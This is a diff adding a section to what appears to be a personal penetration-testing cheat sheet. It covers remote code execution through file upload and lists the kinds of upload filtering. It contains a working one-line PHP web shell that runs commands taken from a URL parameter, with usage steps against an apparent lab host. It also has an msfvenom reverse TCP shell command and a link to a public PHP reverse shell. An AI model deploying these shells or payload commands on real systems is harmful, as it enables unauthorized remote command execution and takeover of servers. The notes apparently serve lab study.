@@ -736,3 +736,31 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 
 ---
 
+# PHP RCE from a File Upload
+
+```
+<?php
+    echo system($_GET["cmd"]);
+?>
+```
+
+- add this to a web directory with a filename like 'webshell.php'
+- then navigate to the file you uploaded and add to the url your console cmd
+  
+>e.g. 'http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls'
+
+then from here we can upload an RCE
+
+>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+---
+
+### Client-side filtering and server-side filtering
+
+- Extension Validation
+- File Type Filtering
+  - MIME validation
+  - Magic Number validation
+- File Length Filtering
+- File Name Filtering
+- File Content Filtering
